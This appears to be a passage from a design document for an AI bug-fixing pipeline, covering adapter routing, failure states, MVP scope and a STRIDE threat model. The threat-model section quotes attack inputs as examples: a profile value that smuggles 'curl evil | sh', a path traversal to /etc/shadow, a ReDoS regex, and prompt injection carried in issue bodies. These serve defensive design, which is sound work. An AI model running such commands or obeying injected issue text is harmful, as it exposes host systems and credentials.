**The structural guarantee:** because the seam is a *data handoff into a phase whose allowlist excludes source writes and PR creation*, the only way to break compose-not-duplicate would be to **widen the gate's invocation-#1 allowlist** — a change to the *gate*, caught by the gate's own mode-parity lint, not a silent investigate-bug drift. A "fifth terminal state" or any write-side logic in investigate-bug is the tell (the PRD's compose-erosion Goodhart leg); there is no place to *put* it.

### E.4 — The handoff bundle (AC6)

investigate-bug passes into P4:

1. **The reproducing red test** (written under B2, confirmed red by the gate's P3).
2. **`PLAN.json`** — the planned source-file set, emitted by the runner in invocation #1 so the gate's **Stage-A sensitive check has its input** without investigate-bug inspecting the deny-globs.
3. **A fenced bug-context bundle** — the issue body + relevant `LogLine`s, placed **inside the gate's per-run random nonce fence** as **data-not-instructions** (the gate's N2 convention, `SKILL.md:176-191`). The **title goes inside the fence** (the exact BookBridge hole the gate closed). investigate-bug does **not** invent its own fence — it formats the bundle to the gate's nonce-fence shape (the gate owns the nonce).

investigate-bug does **not** post back — it stops at the P3→P4 handoff. `tracker.comment` (posting the PR link onto the issue) is a **downstream-consumer** step *after* the gate returns (e.g. BookBridge's comment-back, matching its real `gh issue comment` step). It is neither investigate-bug's nor the gate's: the gate's own escalation comment goes via the gate's `gh` (`SKILL.md:96`), not via a routed adapter. (See §A.1 and §G.)

### E.5 — Terminal states: the gate's four, no fifth (AC6)

The combined flow's terminals are **exactly the gate's four** (`SKILL.md:89-100`): **DRAFT-PR / ESCALATE / NOT-REPRO / HALT**. investigate-bug adds **no fifth**:

- Can't reach a reproducing test → lands in the gate's **NOT-REPRO** (not a new investigate-bug terminal).
- Adapter `AdapterError(RATE_LIMIT|AUTH)` or no binding resolves unattended → the gate's **ESCALATE** / **HALT** (fail-closed; §E.6).
- Sensitive-path fix → the gate's **ESCALATE** (the gate's P4 owns the refuse; investigate-bug hands off and stops — S6).

### E.6 — Failure routing (every failure maps to a gate terminal, never "logs and continues")

| investigate-bug failure | Routes to |
|---|---|
| Profile absent/malformed | prompt `/apex:detect-stack` (interactive) / **HALT** "no profile" (unattended) — S7 edge |
| Unsupported `kind` (no adapter) | ask-user (interactive) / **ESCALATE** (unattended) — S7 |
| Unattended, `cli=""` (MCP-only axis) | **ESCALATE** — never an MCP attempt (S5.2 / AC3) |
| `AdapterError(RATE_LIMIT)` | the same storm that exhausts spend → the gate's **HALT** (fail-closed, `SKILL.md:51-52`) |
| `AdapterError(AUTH)` | ask-user (interactive: "the binding can't auth — paste the issue") / **ESCALATE** (unattended) |
| `AdapterError(NOT_FOUND)` on the issue | ask-user (interactive) / **ESCALATE** (unattended) |
| `AdapterError(UNAVAILABLE)` (backend down) | interactive: liveness-probe fallback ladder (§B.1: MCP→CLI→ask-user); unattended: **ESCALATE** (no fallback human) |
| `AdapterError(MALFORMED)` (unparseable response) | ask-user (interactive) / **ESCALATE** (unattended) — never proceeds on garbage |
| No reproducing test possible | the gate's **NOT-REPRO** |
| Fix would touch a sensitive path | hand off; the gate's P4 refuses → **ESCALATE** (S6) |

### E.7 — Distinct-from (the three neighbors)

- **vs `autonomous-fix`** (`skills/autonomous-fix/SKILL.md`): the gate owns the **WRITE** (P4: sensitive-path refuse, fence, cost cap, draft-only, gate-owned commit). investigate-bug owns the **read / diagnose / route** that *instantiates the gate's P2+P3 and feeds P4*. Producer/consumer along the gate's own P3→P4 boundary. **Direction fixes the parent/child:** investigate-bug calls *into* the gate (the gate is the WRITE-GATE parent). Do **not** invert.
- **vs BookBridge `investigate-bug`** (`/Users/raviv/devenv/BookBridge/.claude/skills/investigate-bug/SKILL.md`): generic apex:investigate-bug is the **parent**; BookBridge's becomes a **thin consumer** that calls it and adds F-049 specifics (its DB queries, hypothesis matrix). **Direction fixes the parent/child:** BookBridge calls *into* generic (generic is the DIAGNOSIS parent BookBridge consumes). The full chain: **BookBridge investigate-bug → generic apex:investigate-bug → autonomous-fix.** ⚠️ This **interposes the generic layer between BookBridge's investigate-bug and the gate.** The frozen gate PRD does **not** say investigate-bug is a "direct child"; it describes BookBridge's pipeline as **two** artifacts — `investigate-bug` (read-only investigation) + `auto-fix-bug.yml` (the fix path) — with autonomous-fix the **parent of both** (`docs/autonomous-fix/prd.md:5,154`; `skills/autonomous-fix/SKILL.md:29`). The amendment is narrow: the *investigation* child now invokes the generic skill (which composes the gate); the gate stays parent of the *fix* path. **This supersession was already decided in the stack-adapters PRD** (`prd.md:111,117,121`) — the design only *carries it back* to the gate docs (§H), it does not re-author the decision.
- **vs `superpowers:systematic-debugging`** (external companion): owns the **reproduce / root-cause technique**. investigate-bug *requires* a reproducing test and *invokes* it (via the gate's P3); it does **not** re-teach debugging.

---

## §F — MVP cut + deferral list

### F.1 — MVP (the smallest thing that satisfies the PRD's ACs)

PR-A (`detect-stack`) + PR-B (generic `investigate-bug` + two adapters). Concretely: three probes (deps / CI / connected-MCP — env-var-NAMES is PR-C, F3) + the TOML writer + the AC1 value-shape lint (incl. `repo_path` confinement) + the AC2/AC7 writer (PR-A); the resolver + the two per-axis contracts + the gh + grep adapters + the P3→P4 handoff (PR-B). **Zero vendor integrations. No obs adapter. No second tracker.**

**Adversarial MVP-strike (design-feature Pass 2 counter-pass):** strike the obs adapter from MVP entirely (ship tracker-only)? — **No:** AC4 requires *two* adapters across *two* axes to prove the per-axis contract isn't tracker-shaped (the S9 conformance proof needs ≥2 axes). Strike the conflicting-signal rule (S10)? — **No:** it's the AC7 honesty floor; without it detect-stack silently picks and the whole "no fabrication" claim collapses. Strike the two-binding rule, ship CLI-only? — **No:** that's the entire interactive/unattended thesis (AC2/AC3); CLI-only would route fine in CI but waste a dev's connected MCP and re-introduce the MCP-only-dies-headless trap the moment someone adds an `mcp` field by hand. The MVP is already minimal — every struck element breaks an AC.

**Brief↔design reconciliation (so a brief→design read doesn't flag an apparent settled-decision violation):** `brief.md` decision (2) reads literally "observability adapter first," yet this design ships **console-grep first** and defers the first *vendor* obs adapter to PR-C. These reconcile via the PRD: the brief's "obs-first" means **ship the obs *axis* in the MVP** — and console-grep IS the MVP obs adapter (it satisfies AC4's two-axes conformance proof). The first *vendor* obs adapter (Datadog/Sentry) is PR-C. The design tracks the PRD's reconciliation, not the brief's literal wording; nothing is dropped.

**Added-scope check:** nothing in this design is beyond the PRD's ACs. The `secret_ref` field is forward-compat (U4) — the schema *slot* is reserved (PR-A) so the AC1 value-shape rule already covers it, but **MVP detect-stack does not write it** and **no obs-creds resolution code ships** (no obs adapter to resolve them, and writing the name is pure topology disclosure — F3, §6 Info-disclosure). That's reserved-schema-forward-compat, not scope expansion.

### F.2 — Deferral list (PR-C/D/E + sub-deferrals)

| Deferred | Why not MVP | Re-eval trigger |
|---|---|---|
| **PR-C — first real obs adapter (Datadog/Sentry)** | The shape is proven with grep first; a vendor obs adapter is the first *real* adapter *after* the contract freezes | BookBridge's live observability work lands as the thing to generalize |
| **PR-D — second tracker (Linear/Jira)** | Confirms the abstraction isn't GitHub-shaped — valuable, not load-bearing for proving the shape with two universal backends | A consumer needs a non-GitHub tracker |
| **PR-E — retrofit `incident-retro` onto the adapter layer** | A separate consumer of the same shape | The adapter contract is frozen + adopted once |
| **Routing the *write* to a vendor agent (Seer/Copilot-agent)** | Forward-compat noted in PRD §9; MVP routes the write to `autonomous-fix` only | A vendor fix-backend becomes a desired terminal |
| **`secret_ref` *resolution* path** | Schema field ships (PR-A); the resolution code is PR-C's (no obs adapter needs it in MVP) | PR-C |

**Adversarial deferral-bite check (design-feature Pass 3 counter-pass):** does any deferral hot-fix-bite within 24h of launch? — **No.** PR-C/D/E are catalog growth; their absence is *designed* (grep + gh are the deliberate universal backends). The one that could bite — `secret_ref` resolution — is gated behind "no obs adapter ships," so there's nothing to resolve. None embarrass on day one.

---

## §G — Integration with the existing surface

### G.1 — Command #15: the menu sweep (PR-A, atomic)

`/apex:detect-stack` is the **15th** `/apex:` command. The live count is **14** (`commands/` holds 14 files; verified). PR-A bumps **14→15** at every canonical count-site in the **same PR**. The site registry is the **"Known sites holding the count" table at `MAINTAINING.md:43-52`** (header `:43`, the six rows `:47-52`; verified at HEAD); re-grep at build time via the fenced recipe at `MAINTAINING.md:58-61` (the `### Grep command` block; code lines `:59-60`):

```bash
grep -rEn '[0-9]+[* ]+entry-point|[0-9]+-command cheat sheet|~?[0-9]+ things you drive' \
  --include='*.md' --exclude-dir=node_modules --exclude-dir=.claude .
```

**`--exclude-dir=.claude` is required** (drift not in the canonical MAINTAINING.md recipe — §G.4): a stale worktree copy of the whole repo lives at `.claude/worktrees/wonderful-almeida-a10191/`, and the bare recipe surfaces **7** count-sites inside it — an implementer who bumps those is editing a throwaway tree. Excluding `.claude` confines the sweep to the six canonical sites below. (Coordinate to land this `--exclude-dir=.claude` addition into PR #25's MAINTAINING.md registry recipe too, so the canonical recipe gains the same guard.)

The six live "14" sites to bump (verified against the tree):

| File:line | Form |
|---|---|
| `README.md:59` | `the ~14 things you drive by hand` |
| `README.md:222` | `the 14-command cheat sheet` |
| `README.md:233` | `Only the 14 **entry-point** commands` |
| `commands/help.md:10` | `the entire /apex: slash menu (14 entry-point commands)` |
| `commands/help.md:61` | `Only the 14 entry-point commands above` |
| `WALKTHROUGH.md:100` | `limited to the 14 entry-point commands` |

**Do NOT touch** (per U6, verified): the historical `CHANGELOG.md` "menu stays 13/12" lines (true-at-the-time); the `~6 commands` workflow narrative in `HOWTO.md` / `WALKTHROUGH.md:26` (a per-feature narrative, not a menu count); `docs/incident-retro/design.md:8` "menu stays lean" (no number).

PR-A also **adds the command row** to `commands/help.md`'s actual list (the "YOU TYPE THESE" block, after `/apex:setup`):

```
  /apex:detect-stack       Probe this repo's stack → write apex.profile.toml (bug-loop routing)
```

### G.2 — FLOW.md placement (the DEBUG / bug-loop side-path)

Both skills are **side paths** (not phase-sequential), placed **alongside `autonomous-fix`** in FLOW.md's "Side paths" section (`FLOW.md:254+`). A new side-path block after the existing **AUTONOMOUS BUG-FIX** block (`FLOW.md:260`):

> **STACK-ADAPTIVE BUG LOOP.** Before the unattended path runs, `/apex:detect-stack` probes a repo (deps / CI / connected MCP) and writes a routing-only `apex.profile.toml` (no secrets). Generic `apex:investigate-bug <ref>` then reads that profile, routes per axis to the configured adapter (interactive→MCP-first; unattended→CLI-only, the CI default), runs the gate's read-only investigate + reproduce phases, and hands the reproduced bug into `apex:autonomous-fix`'s P4 write phase. The MVP ships two universal adapters — GitHub-tracker via `gh`, console-logs via `grep` — and zero vendor integrations: apex *discovers and routes*. A project's bug-bot (e.g. BookBridge's F-049 pipeline) becomes a thin consumer of generic `investigate-bug`.

Plus two rows in the **Skill × Phase matrix**'s side-path list (after the `apex:autonomous-fix` line, `FLOW.md:305`):

```
apex:detect-stack    — side path; config step. Probes the stack, writes routing-only apex.profile.toml.
apex:investigate-bug — side path; adapter-routed diagnosis. Reads the profile, routes per axis, runs the gate's read-only P2/P3, hands into autonomous-fix P4. BookBridge's investigate-bug is a thin consumer.
```

The existing **DEBUG** side-path (`FLOW.md:256`) is untouched — it points at `superpowers:systematic-debugging` (the reproduce *technique*), which investigate-bug *invokes*; no overlap.

### G.3 — help.md, README rows

- **help.md (PR-A):** the new "YOU TYPE THESE" row (G.1) + count bumps. detect-stack is the only command; investigate-bug is **not** a command (invoked by name, the `autonomous-fix`/`incident-retro` precedent) — so investigate-bug joins the "I FIRE THESE AUTOMATICALLY" → "Post-release" block (PR-B, `commands/help.md:37-39`, beside `autonomous-fix`):
  ```
  detect-stack / investigate-bug (the stack-adaptive bug loop — detect-stack
              writes apex.profile.toml; investigate-bug routes a bug across your
              stack and hands the reproduced fix to autonomous-fix's write phase)
  ```
- **README rows (REQUIRED, not conditional — both tables exist at HEAD):** the README carries a `### Skills` table (`README.md:13`, header `:17`, ending at the `### Commands` header `:57`) **and** a `### Commands` table (`README.md:57`, header `:63`, ending at the `### Hooks` header `:81`). These are mandatory PR edits with anchors, the same discipline as the §G.1 count-sites — *not* a hedged "if the README carries a table":
  - **PR-A:** add a `detect-stack` row to the **Skills** table (`README.md:13-56`, beside the routing/setup skills) **and** a `/apex:detect-stack | detect-stack | …` row to the **Commands** table (`README.md:57-80`, the sibling of the count-bump — detect-stack IS a slash command, so the Commands table MUST gain a row or the 15-command menu has a 14-row table).
  - **PR-B:** add an `investigate-bug` row to the **Skills** table (`README.md:13-56`, beside `autonomous-fix` at `:53`). investigate-bug does **NOT** get a Commands-table row — it is invoked by name, not a slash command (the `autonomous-fix`/`incident-retro` precedent; neither appears in the Commands table either).
  - **Pre-existing drift the impl-plan author should not be surprised by:** the README Commands table covers 13 of the 14 slash commands — it is missing a `/apex:adversarial-pair` row (a pre-existing gap, not PR-A's to fix). The Commands-table row count therefore already ≠ the menu count; PR-A adds detect-stack and leaves the adversarial-pair gap as found.

### G.4 — Repo drift coordination (honored)

- **`apex:adversarial-pair`** (`skills/adversarial-pair/SKILL.md`, exists) — this design's §F STRIDE heavier pass dispatches via `apex:adversarial-pair` (NOT `superpowers:dispatching-parallel-agents`), matching the gate's `SKILL.md:115` and FLOW's ADVERSARIAL PAIR side-path.
- **apex-primer / suggest-review-on-stop hooks** (`hooks/apex-primer.sh`, `hooks/suggest-review-on-stop.sh`, exist) — no change needed; neither fires on profile/skill paths in a way that conflicts.
- **PR #25 — `MAINTAINING.md` + `hooks/suggest-skill-on-edit.sh`** (the hook exists; it injects "read MAINTAINING.md" when editing apex's own `skills/`/`commands/`/`hooks/`). **Coordinate:** PR-A touches `commands/` (the new command), `README.md`, and the count-sites — the hook will fire its MAINTAINING.md reminder on those edits (expected, not a conflict). If PR #25 is still in flight when PR-A lands, rebase the count-site bumps onto PR #25's MAINTAINING.md (the registry is the merge point). Do **not** edit `suggest-skill-on-edit.sh` — neither PR-A nor PR-B changes API-surface detection. Also land the `--exclude-dir=.claude` recipe guard (§G.1) into PR #25's registry.
- **Stale worktree (`.claude/worktrees/wonderful-almeida-a10191/`)** — a full throwaway copy of the repo. The bare count-grep surfaces 7 false hits inside it; the §G.1 recipe's `--exclude-dir=.claude` confines the sweep. Ignorable to the MVP — **do not bump** the worktree's copies.

---

## §H — Cross-PRD amendment (carried back)

**This supersession is already decided in the stack-adapters PRD** (`prd.md:111,117,121` — the frozen "three-layer chain" line). The design's job here is only to **carry it back** to the gate docs, not to re-author it.

**The amendment target — stated against the gate PRD's *actual* wording (not a strawman).** The gate PRD does **not** call BookBridge's `investigate-bug` a "direct child." It describes BookBridge's pipeline as **two** artifacts — the *investigation* discipline (`investigate-bug`, read-only) + the *fix* path (`auto-fix-bug.yml`) — with `autonomous-fix` the **parent of both** (`docs/autonomous-fix/prd.md:5` and `:154`; mirrored in `skills/autonomous-fix/SKILL.md:29`). The carry-back is a **one-line note** at each of those three sites (`prd.md:5`, `prd.md:154`, `SKILL.md:29`): *the investigation child now interposes the generic `apex:investigate-bug` — the chain is BookBridge investigate-bug → generic apex:investigate-bug → autonomous-fix; the gate remains the direct parent of the **fix** path (`auto-fix-bug.yml`)*. The gate's parent-of-the-fix-path relationship is unchanged; only the investigation child gains the interposed layer.

To avoid double-claiming the no-source-write rule: **the gate owns the read-only-first *allowlist mechanism* (P2/AC7b); generic investigate-bug is the *adapter-routed instantiation* that runs inside it.** (This is a docs-only amendment, carried as a one-liner at each of the three sites in the PR-B description, not a gate behavior change.)

---

## §I — Failure modes (design-feature Pass 5) — user-visible behavior

| Failure mode | User-visible behavior |
|---|---|
| **Cold start — no profile** | investigate-bug: "run `/apex:detect-stack` first" (interactive) / **HALT** "no profile" (unattended). Never guesses a stack. |
| **Empty data — issue has no diagnostics** | `fetch_issue` returns a `NormalizedIssue` with empty `comments`/`labels`; investigate-bug derives the window from the body or asks (interactive) / proceeds with body-only and lets the gate's P3 BLOCK if no repro (unattended → NOT-REPRO). |
| **Empty data — `query_logs` returns `[]`** | Not an error: zero in-window lines is a valid result; diagnosis proceeds on issue+commits, and a thin log trail is noted in the bundle. Never crashes. |
| **Half-completed — detect-stack interrupted mid-write** | The writer writes to a temp file + atomic rename (no partial profile on disk); a re-run re-detects and updates in place (D.3). |
| **Half-completed — investigate-bug crashes after the red test, before handoff** | The one write is the test file under the gate's B2 carve-out; the gate's invocation-#1 worktree is the gate's to discard (`SKILL.md:37`) — no half-applied source, the gate owns the commit. |
| **Permission denied — `AdapterError(AUTH)`** | ask-user (interactive: "the gh/MCP binding can't auth — paste the issue") / **ESCALATE** (unattended). Never silently empty. |
| **External-dep failure — MCP server down mid-session** | The interactive resolver's liveness probe (`mcp_server_connected`) fails → falls to the CLI binding → ask-user (the §B ladder). Never hangs on a dead MCP. |
| **External-dep failure — `gh`/`grep` absent on PATH** | `cli_on_path` fails → ask-user (interactive) / **ESCALATE** (unattended, `cli` declared but missing). |
| **Concurrent access — two investigate-bug runs on the same issue** | investigate-bug holds no cross-run state; concurrency is the **gate's** `concurrency:` per-issue guard (`SKILL.md:55`) — exactly one gate run per issue. investigate-bug inherits this; it adds no locking. |
| **Stale profile — routing miss** | investigate-bug suggests a re-detect (`/apex:detect-stack`) rather than guessing (U3). |
| **Conflicting signals at detect time** | prompt (interactive) / `# TODO: resolve (...)` placeholder (unattended) — never silently picks (S10/D.2). |

**Adversarial counter-pass (design-feature Pass 5):** the one mode that risked "logs and continues" was `query_logs → []`; resolved above as an explicit *valid-empty* result, not an error swallow. The failure mode unique to this feature (not in the standard list): **a human hand-edits `apex.profile.toml` and smuggles a token into a `service` field.** Resolved: `load_profile` shape-validates **on read** (C.3), not just on detect-stack write — so a smuggled token fails AC1 at investigate time, before it routes.

---

## §6 — Attack surface (STRIDE) — `apex:threat-model` + `apex:adversarial-pair` for the heavier pass

**Trust boundaries crossed:** (1) the **routed issue body / log lines** — untrusted data from a tracker/log backend, crossing into investigate-bug's diagnosis and the gate's prompt; (2) the **`apex.profile.toml`** read in CI — a config file that drives *which service a bug routes to*; (3) `secret_ref` *names* (no values) bridging to CI secrets. **Data classes:** routing config (no secrets in the profile, by AC1); issue/log content (may contain PII/secrets pasted by a reporter — handled as fenced data). **Actor model:** an attacker who can file an issue / inject a log line (external, low-privilege); a malicious dependency supplying an adapter; an insider editing the profile.

This feature **routes untrusted input into a write-gate's prompt** and **reads a config that decides which service to reach** — it qualifies for the heavier two-agent pass. Dispatch via **`apex:adversarial-pair`** (apex's canonical mechanic, `skills/adversarial-pair/SKILL.md` — NOT `superpowers`): a **cooperative** agent confirms each mitigation is present and fail-closed; an **adversarial** agent attacks (forge a profile, inject via the routed issue, point an axis at the wrong service). Reconcile in `design-review.md`.

### Spoofing
- **Mitigation:** investigate-bug doesn't authenticate principals — it routes *to* a binding whose auth is the binding's (gh's `gh auth`, the MCP server's config, CI secrets). The **profile `kind` is not a trust signal** — an attacker who flips `kind` only changes which *adapter* runs, not what it can reach (the adapter's auth is unchanged). 
- **Residual (accepted):** a compromised MCP server connected to the session could impersonate a tracker (return a forged issue). Mitigated by the gate's downstream rails (the forged issue still must produce a *red reproducing test* to reach P4 — an issue body alone can't open a PR). The interactive dev sees the MCP they connected; the unattended path uses CLI only (no session MCP to compromise).

### Tampering
- **Mitigation — the profile in CI (descriptor fields):** the value-shape allowlist (C.2) rejects a token/command-injection-shaped value in any field; `cli` is a bare command name (no `;`/`|`/path), so a `cli = "gh; curl evil | sh"` value fails the shape check on read (C.3). The loader shape-validates **on read in CI**, not just on write — a tampered profile committed by an insider is caught at investigate time.
- **Mitigation — the profile in CI (the operation field `log_path`, F1):** shape alone is **insufficient** for `log_path`, because the console adapter *opens and reads* the path — `log_path = "../../../../etc/shadow"` is pure path chars and would pass an `identifier`-shape check, then be slurped into the bug-context bundle (a strictly larger disclosure surface than reporter-pasted content: an attacker chooses *which host file* enters the model's context). Closed by the **`repo_path` field-kind** (C.2): repo-relative only, no `..`, resolved realpath must stay under the repo root, rejecting both traversal and an escaping symlink — **plus** the console adapter confines its own reads to the repo tree (defense-in-depth). This is the F1 fix; without it AC1 was *not* decidable for `log_path`.
- **Mitigation — injection via the routed issue/logs:** the issue body + log lines enter the gate's P4 **inside the gate's random-nonce fence as data-not-instructions** (E.4, the gate's N2). investigate-bug never executes a tool an issue names; the title goes inside the fence (the BookBridge hole the gate closed).
- **Mitigation — the grep `query` derived from the untrusted issue (F2):** investigate-bug's steps 3–5 (§E.1) compute `derive_window`/`ids_from`/`paths_guess` from the **un-fenced** issue body *before* the P4 fence applies. The grep `query` passed to `query_logs` (`ids_from(issue)`) MUST be an **escaped literal**, never a passthrough regex — a crafted body must not become a catastrophic-backtrack pattern (`(a+)+$`) over an in-window log slice (the ReDoS amplifier the DoS bullet below would otherwise miss). `derive_window`/`paths_guess` are heuristics whose worst case is a **wrong-but-bounded** plan: a malicious `paths_guess` steers `PLAN.json`, but the gate's Stage-A sensitive check runs on `PLAN.json` (`SKILL.md:36`), so it cannot bypass the refuse — see the named residual below.
- **Residual (accepted):** the gate's one-hop import-line transitive check (`SKILL.md:155`) misses depth-≥2 / dynamic imports — inherited from the gate, not new here; fed to `incident-retro`. **Newly named:** an attacker who files the issue *steers* `paths_guess` toward a benign path adjacent to a sensitive one to probe that one-hop boundary — the attacker now holds the steering wheel for the gate's existing depth-≥2 residual, but cannot widen it (the gate's Stage-A/B refuse + draft-only still bound the outcome to NOT-REPRO/ESCALATE).

### Repudiation
- **Mitigation:** detect-stack writes a profile a human reviews in the PR (in-repo, version-controlled — every routing change is a diff). investigate-bug's terminal is the gate's (DRAFT-PR/ESCALATE/NOT-REPRO/HALT), each emitting the gate's structured artifact (`SKILL.md:93-98`); the ESCALATE hard leg makes a refusal durable.
- **Residual:** none beyond the gate's.

### Information disclosure
- **Mitigation — `secret_ref` resolution (PR-C):** the profile holds env-var **NAMES only** (AC1 `[A-Z][A-Z0-9_]*` shape); the *value* is resolved by CI from its own secrets at the obs adapter's call (PR-C), extending the gate's least-priv token model (`SKILL.md:151`, U9) — the profile never holds a credential, so committing it leaks nothing. The MVP console adapter needs **no creds** (grep over a local path), so the MVP ships no secret resolution at all.
- **Mitigation — secret-topology recon at MVP (F3):** even an env-var *name* (`secret_ref = "STRIPE_SECRET_KEY"`) committed to a public repo is recon — it reveals which vendors and credential names the CI carries. Since **no MVP consumer resolves `secret_ref`**, the MVP **does not auto-populate it at all** (the §D.1 env-var-NAMES probe is deferred to PR-C, where the obs adapter that consumes it lands). The schema slot is reserved (forward-compat) but unwritten in an MVP profile — closing the disclosure surface rather than shipping an unconsumed, topology-revealing field.
- **Mitigation — leak via the bundle:** the fenced bug-context bundle passes into the gate's P4, where the gate's **leak-scan** (`SKILL.md:75`, AC8) covers the commit message + PR body + any agent comment — investigate-bug doesn't author a terminal write, so it adds no new leak sink.
- **Residual (accepted):** an issue body / log line a reporter pasted may contain PII/secrets; it enters the bundle as fenced data and the gate's leak-scan guards the *sinks* (commit/PR/comment), but the data is in the model's context. Same residual class as the gate's; the mitigation is the leak-scan on the way *out*, not redaction on the way in.

### Denial of service
- **Mitigation — volume:** `query_logs(window, ...)` requires a **bounded window** (A.2, no default-unbounded) — a "grep the whole 10GB log" amplifier requires the caller to widen the window explicitly, which is visible. The gate's **fail-closed cost cap** (`SKILL.md:51-55`, P1) wraps the whole flow including investigate-bug's reads; an `AdapterError(RATE_LIMIT)` (the storm that exhausts spend) → the gate's HALT, fail-closed (E.6).
- **Mitigation — pattern complexity (ReDoS, F2):** the volume bound does not stop a **catastrophic-backtrack regex** the attacker supplies via the issue body (`ids_from(issue)` → the grep `query`). Closed by §E.1's rule: the grep `query` is an **escaped literal, never a passthrough regex** — the attacker-controlled string is a fixed substring, not a pattern, so there is no backtracking surface.
- **Residual (accepted):** the console adapter's grep cost scales with log file size; a giant log file is a local-resource concern bounded by the window + the gate's wall-clock timeout, not a remote amplifier.

### Elevation of privilege
- **Mitigation — a malicious/absent adapter (agent-tool layer):** the dispatch table maps `kind → adapter`; an **absent** adapter (unsupported `kind`) routes to ask-user/escalate (S7), never a silent stub (AC4). A **malicious** third-party adapter has **no source-write or PR-create affordance via the agent's tool belt** — investigate-bug runs in the gate's read-only invocation-#1 allowlist (E.3), so it cannot use the *agent* to open a PR or write source; the worst it can do *through the agent* is return forged diagnosis data, which still must clear the gate's red-test + sensitive-path + draft-only rails. The privilege transition (write access) is **entirely the gate's P4**, never investigate-bug's.
- **Residual (accepted) — adapter-code layer (G1):** an adapter is **Python code dispatched by `kind`** (§B.3), i.e. **arbitrary in-process code**. The read-only allowlist bounds the *agent's tools*, not what an imported adapter module can do at import/call time (`os.system`, sockets, filesystem) — those run with **process privilege**, not allowlist-bounded. So "even a malicious adapter has no write affordance" is true only for the *agent-tool* layer, not the *adapter-code* layer. **Mitigated in the MVP** because it ships only **first-party** adapters (gh/grep, apex-reviewed); any future third-party adapter is a **reviewed dependency** under normal supply-chain trust. The structural compose-not-duplicate guarantee (E.3) still holds — a malicious adapter cannot widen the *gate's* P4 — but the design does not claim adapter code is sandboxed.
- **Mitigation — routing to the wrong service:** flipping `kind` (or, in PR-C, `[observability] service`) changes *which backend the adapter queries* — but the adapter's auth is unchanged (it can only reach what its binding's creds allow), and a wrong service returns wrong/empty logs → at worst a NOT-REPRO, never a privilege gain. The profile is in-repo + reviewed, so a wrong-service edit is a visible diff. (`service` is a PR-C field, §C.1 — in the MVP only `kind`/`log_path` route the obs axis.)
- **Mitigation — `vcs.repo`/`host` from `git remote get-url origin` (G2):** detect-stack reads the remote URL to populate `[vcs]` (§D.1). A remote URL is attacker-influenceable in a cloned-from-untrusted scenario, so it is an injection sink at detect time — but `repo`/`host` are `identifier`-kind **descriptors** the adapter never opens or executes (the descriptor-vs-operation distinction, C.2), so the shape check is sufficient. This is exactly why `log_path` needs `repo_path` confinement (F1) and `repo`/`host` do not: the former becomes a file read, the latter stays a name.
- **Residual (accepted):** an insider who both edits the profile *and* supplies a matching malicious adapter could route a bug's *diagnosis* to an attacker-controlled service — but cannot escalate to a write (the gate's P4 is unreachable without a red test + non-sensitive path + draft-only). This is the gate's confused-deputy residual class (`SKILL.md:79`), not widened here; mitigated by profile-in-repo review + the gate's draft-only-human-merges invariant.

**STRIDE pass/fail:** all six categories have a named mitigation or an explicitly-accepted residual. The two highest-cost surfaces — **the profile read in CI** (Tampering: shape-validate-on-read, **plus `repo_path` confinement for the one operation field, F1**) and **a malicious adapter** (EoP: no write affordance via the agent's tools, the gate owns P4; the **adapter-code-is-process-privileged residual, G1**, named and bounded to first-party MVP adapters) — both resolve to "investigate-bug holds no *write* privilege; the gate does, behind its rails." That is the same structural property as compose-not-duplicate (§E.3): **investigate-bug cannot do the dangerous thing because the dangerous *write* affordance lives in the gate's allowlist, not its own.** **The config-value-as-capability blind spot is closed** by the descriptor-vs-operation distinction (C.2): descriptor fields (`repo`/`host`/`kind`/`service`) need only shape; operation fields (`log_path`→file read, `cli`→process) need confinement/charset-hardening. **The pre-fence-derivation blind spot is closed** by §E.1's untrusted-input rule (escaped-literal grep `query`; bounded-worst-case `derive_window`/`paths_guess` caught by the gate's Stage-A on `PLAN.json`).

---

## §J — Overlap + OSS scans (design-feature, implementation lens)

**Overlap (verdict: no parallel path).** The one true adjacency — `autonomous-fix` — resolves as the read-layer feeding the write-gate along the gate's own P3→P4 edge (§E.7). The duplication risk — BookBridge's `investigate-bug` — resolves by promoting the generic form into a three-layer chain (§E.7, §H). `recon`/`setup` are bounded by the committed Distinct-from lines (§D.4). No partial/abandoned implementation in the apex tree parallels this (verified: no `skills/detect-stack/` or `skills/investigate-bug/` exists yet; `apex.profile.toml` is a new artifact).

**OSS (verdict: route over, don't adopt).** The adapters wrap tools every repo has: **`gh`** (use directly — `fetch_issue`=`gh issue view --json`, `comment`=`gh issue comment`), **`grep`/ripgrep** (use directly — `query_logs`), **MCP+ToolSearch** (the interactive binding substrate; apex ships no MCP server, detects connected ones). **`backstage`/`cortex`** IDP catalogs: reference (their `catalog-info.yaml` in-repo-descriptor pattern informs `apex.profile.toml`'s shape), reject adoption (heavyweight, infra). **Adaptive bug-triage products** (Sentry Seer, Copilot coding-agent, Linear/Jira agents): reference, reject *as the loop* — each is a point in the 288-grid, not a router over it; they are candidate *fix-backends* (forward-compat, PR §9), not competitors. The distinctive atom none package: **a routing-only, secrets-free, two-binding-per-axis profile + a tool-neutral per-axis adapter contract that composes a separate auditable write-gate across a heterogeneous stack.**

---

## §K — Hand-off

On `apex:design-review` freeze → the build order is **api-surface-review (done here, §A) → PR-A → PR-B** (strict, per PRD §7):

- **PR-A** — `apex:detect-stack` skill + `/apex:detect-stack` command + the probes (**three in the MVP** — deps / CI / connected-MCP; the env-var-NAMES probe is PR-C, F3) + the TOML writer + the AC1 value-shape lint (mirrors `skills/autonomous-fix/reference/conformance-lint.py`, **including the `repo_path` confinement rule for `log_path`**, F1) + the AC2/AC7 writer (**carrying the AC2b no-silent-drop invariant and the AC7 un-inferable predicate pinned in §D.3**) + S1/S2/S3/S7/S10 fixtures. Plus the **README Skills + Commands table rows + the six count-site bumps with `--exclude-dir=.claude`** (§G.1/§G.3). The frozen schema (§C) + frozen adapter contract (§A) gate it. **LOC note (PRD §7):** if PR-A exceeds 400 LOC, split at impl-plan time — **PR-A1** (schema + writer + value-shape lint incl. `repo_path`) → **PR-A2** (the three detectors).
- **PR-B** — generic `apex:investigate-bug` skill + the two per-axis contracts + the gh + grep adapters + the resolver + the P3→P4 handoff + S4/S5/S6/S8/S9 fixtures. Depends on PR-A's frozen profile schema. Carries the §H one-line cross-PRD amendment in its description.
- **Downstream:** the BookBridge `investigate-bug` refactor to a thin consumer is the **first conformance test** of the frozen contract + schema (a separate repo, this design can't gate it — treat as the lagging-metric proof, PRD §6).

